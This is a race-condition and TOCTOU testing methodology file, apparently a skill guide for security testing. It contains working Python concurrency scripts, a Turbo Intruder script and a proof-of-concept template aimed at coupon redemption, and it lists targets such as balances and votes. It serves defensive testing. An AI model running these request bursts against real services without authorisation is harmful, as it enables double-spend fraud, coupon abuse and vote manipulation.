---
name: race_conditions
description: Race condition and TOCTOU testing methodology
version: 1.0.0
tags: [logic, concurrency, A04:2021, API4:2023]
---

# Race Condition Testing

## Overview
Race conditions occur when application behavior depends on timing of events, allowing exploitation through concurrent requests.

## Types
1. **TOCTOU**: Time-of-check to time-of-use
2. **Double-Spend**: Financial operations
3. **Limit Bypass**: Quota/rate limit bypass

## Common Targets
- Balance/credit operations
- Coupon/discount redemption
- Vote/rating systems
- Inventory management
- Password reset tokens
- Session establishment

## Testing Methodology

### 1. Identify State-Changing Operations
- Money transfers
- Points/credits usage
- Limited resource consumption
- One-time token usage

### 2. Send Concurrent Requests
```python
import asyncio
import aiohttp

async def exploit():
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(100):
            tasks.append(session.post(url, json=payload))
        responses = await asyncio.gather(*tasks)
    return responses
```

### 3. Analyze Results
- Check for duplicate operations
- Verify final state inconsistency
- Look for negative balances

## Payloads

### Turbo Intruder (Burp)
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=100,
                          requestsPerConnection=100,
                          pipeline=False)
    
    for i in range(100):
        engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

## PoC Template
```python
import asyncio
import aiohttp
import time

async def race_exploit(url, payload, num_requests=100):
    """Send concurrent requests to exploit race condition"""
    
    async def single_request(session, req_id):
        async with session.post(url, json=payload) as response:
            return {
                'id': req_id,
                'status': response.status,
                'body': await response.text()
            }
    
    async with aiohttp.ClientSession() as session:
        tasks = [single_request(session, i) for i in range(num_requests)]
        start = time.time()
        results = await asyncio.gather(*tasks)
        elapsed = time.time() - start
    
    # Analyze results
    success_count = sum(1 for r in results if r['status'] == 200)
    print(f"[*] {success_count}/{num_requests} succeeded in {elapsed:.2f}s")
    
    if success_count > 1:
        print("[+] Race condition likely exists!")
        return True
    return False


# Example usage for coupon redemption
async def test_coupon_race():
    url = "https://target.com/api/redeem"
    payload = {"coupon_code": "DISCOUNT50"}
    
    # User should only be able to redeem once
    await race_exploit(url, payload, num_requests=50)


if __name__ == "__main__":
    asyncio.run(test_coupon_race())
```

## Indicators of Vulnerability
- Balance goes negative
- Coupon applied multiple times
- More votes than allowed
- Duplicate records created
- Rate limits bypassed

## Impact
- Financial loss (double-spend)
- Inventory manipulation
- Voting/rating fraud
- Resource exhaustion
